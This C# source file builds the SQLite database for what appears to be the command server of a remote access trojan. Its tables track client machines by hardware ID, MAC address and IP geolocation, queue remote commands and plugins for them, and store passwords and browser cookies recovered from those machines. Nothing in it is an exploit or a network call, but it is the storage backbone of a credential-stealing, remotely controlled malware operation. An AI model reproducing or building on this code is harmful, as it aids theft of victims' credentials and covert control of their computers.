using Mono.Data.Sqlite;

namespace Orcus.Server.Core.Database
{
    internal static class DatabaseBuilder
    {
        public static void CreateTables(SqliteConnection sqliteConnection)
        {
            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `Client` (Id INTEGER PRIMARY KEY, UserName TEXT NOT NULL, HardwareId TEXT NOT NULL, ClientGroup TEXT, OSName TEXT, OSType INTEGER, Language TEXT, ComputerInformation NONE, LastSeen DATETIME, MacAddress NONE)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `GeoLocation` (ClientId INTEGER PRIMARY KEY, IpAddress TEXT, Country TEXT, CountryName TEXT, Region TEXT, City TEXT, Latitude REAL, Longitude REAL, ZipCode TEXT, Timezone INTEGER)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `Exception` (Id INTEGER PRIMARY KEY, ClientId INTEGER, Timestamp DATETIME, Data NONE)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `DynamicCommand` (Id INTEGER PRIMARY KEY, Status INTEGER, DynamicCommand TEXT, ParameterDataId TEXT UNIQUE, PluginId INTEGER, Timestamp DATETIME)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `DynamicCommandEvent` (Id INTEGER PRIMARY KEY, DynamicCommandId INTEGER, ClientId INTEGER, Timestamp DATETIME, Status INTEGER, Message TEXT)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `StaticCommandPlugin` (Id INTEGER PRIMARY KEY, DataId TEXT UNIQUE, Hash NONE UNIQUE)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `NewClientsStatistic` (Timestamp DATETIME PRIMARY KEY, Count INTEGER)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `ClientsConnected` (Id INTEGER PRIMARY KEY, ClientId INTEGER, Timestamp DATETIME)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `ClientsConnectedStatistic` (Timestamp DATE PRIMARY KEY, Count INTEGER)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `Data` (Id INTEGER PRIMARY KEY, ClientId INTEGER, Timestamp DATETIME, Length INTEGER, FileName TEXT UNIQUE, DataMode TEXT, EntryName TEXT, IsCsvData INTEGER)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `RecoveredPassword` (Id INTEGER PRIMARY KEY, ClientId INTEGER, UserName TEXT, Password TEXT, Field1 TEXT, Field2 TEXT, PasswordType INTEGER, Application TEXT)",
                        sqliteConnection))
                command.ExecuteNonQuery();

            using (
                var command =
                    new SqliteCommand(
                        "CREATE TABLE `RecoveredCookie` (Id INTEGER PRIMARY KEY, ClientId INTEGER, Host TEXT, Name TEXT, Value TEXT, Path TEXT, ExpiresUtc DATETIME, Secure INTEGER, HttpOnly INTEGER, Application TEXT)",
                        sqliteConnection))
                command.ExecuteNonQuery();
        }
    }
}